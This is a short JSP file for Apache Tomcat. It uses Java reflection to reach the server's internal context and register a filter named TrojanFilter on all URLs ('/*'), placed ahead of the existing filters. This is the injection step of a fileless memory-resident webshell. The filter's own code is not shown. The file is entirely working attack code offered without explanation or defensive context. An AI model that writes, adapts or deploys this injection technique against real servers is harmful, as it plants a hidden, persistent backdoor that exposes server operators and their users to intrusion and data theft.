<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="filter.TrojanFilter" %>
<%@ page import="org.apache.catalina.deploy.FilterDef" %>
<%@ page import="filter.TrojanFilter" %>
<%@ page import="java.util.HashMap" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="org.apache.catalina.deploy.FilterMap" %>
<%
    Object obj = request.getServletContext();
    Field field = obj.getClass().getDeclaredField("context");
    field.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) field.get(obj);
    field = applicationContext.getClass().getDeclaredField("context");
    field.setAccessible(true);
    StandardContext standardContext = (StandardContext) field.get(applicationContext);

    FilterDef filterDef = new FilterDef();
    filterDef.setFilterName("TrojanFilter");
    standardContext.addFilterDef(filterDef);
    Filter filter = new TrojanFilter();
    filterDef.setFilter(filter);

    field = standardContext.getClass().getDeclaredField("filterConfigs");
    field.setAccessible(true);
    HashMap hashMap = (HashMap) field.get(standardContext);
    Constructor constructor = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructor(Context.class,FilterDef.class);
    constructor.setAccessible(true);
    hashMap.put("TrojanFilter",constructor.newInstance(standardContext,filterDef));

    FilterMap filterMap = new FilterMap();
    filterMap.addURLPattern("/*");
    filterMap.setFilterName("TrojanFilter");
    standardContext.addFilterMapBefore(filterMap);
    System.out.println("Add filter to filter chain is ok!");
%>
